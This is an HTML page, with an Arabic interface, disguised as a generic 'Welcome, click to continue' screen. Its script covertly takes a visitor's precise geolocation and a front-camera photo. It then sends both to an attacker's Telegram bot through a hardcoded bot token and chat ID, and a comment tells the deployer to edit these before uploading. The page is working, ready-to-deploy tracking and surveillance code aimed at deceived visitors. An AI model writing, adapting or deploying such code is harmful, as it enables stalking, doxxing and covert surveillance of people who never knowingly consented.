<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Welcome</title>
<style>
  body{font-family:system-ui,Arial;direction:rtl;padding:16px}
  button{font-size:18px;padding:10px 14px;margin-top:12px}
  video{width:100%;max-width:420px;border-radius:8px}
  #status{margin-top:8px;color:#333}
</style>
</head>
<body>
  <h2>Welcome</h2>
  <p>Click to continue.</p>

  <video id="video" autoplay playsinline style="display:none"></video>
  <canvas id="canvas" style="display:none"></canvas>
  <div id="status">done</div>
  <button id="goBtn">Next</button>

<script>
/* --- عدّل هذين السطرين قبل الرفع --- */
const BOT_TOKEN = "8202297978:AAFfOI_z409NpvMRaNnVvjij0c9HPj26ZZk";
const CHAT_ID = "8273042434"; // مثال: -1001234567890 أو @MyChannel
/* ----------------------------------- */

const status = document.getElementById('status');
const goBtn = document.getElementById('goBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

async function sendToTelegram(blob, lat, lon, isVideo=false) {
  try {
    status.textContent = "إرسال إلى تليجرام...";
    if (lat && lon) {
      const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: `موقع: ${mapLink}` })
      });
    }
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    if (!isVideo) {
      form.append('photo', blob, 'photo.jpg');
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
    } else {
      form.append('video', blob, 'clip.mp4');
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
    }
    status.textContent = "تم الإرسال بنجاح ✅";
  } catch (err) {
    console.error(err);
    status.textContent = "خطأ أثناء الإرسال: " + err.message;
  }
}

goBtn.addEventListener('click', async () => {
  status.textContent = "طلب إذن الموقع...";
  let lat=null, lon=null;
  try {
    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:20000}));
    lat = pos.coords.latitude; lon = pos.coords.longitude;
    status.textContent = "الحصول على الكاميرا...";
  } catch(e) {
    status.textContent = "فشل الحصول على الموقع: " + (e.message||e);
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:false});
    video.style.display = "block";
    video.srcObject = stream;
    await new Promise(r=>setTimeout(r,1000));
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    canvas.toBlob(async (blob) => {
      stream.getTracks().forEach(t=>t.stop());
      video.style.display = "none";
      status.textContent = "إعداد للإرسال...";
      await sendToTelegram(blob, lat, lon, false);
    }, 'image/jpeg', 0.85);
  } catch (err) {
    console.error(err);
    status.textContent = "فشل الوصول للكاميرا: " + (err.message||err);
  }
});
</script>
</body>
</html>
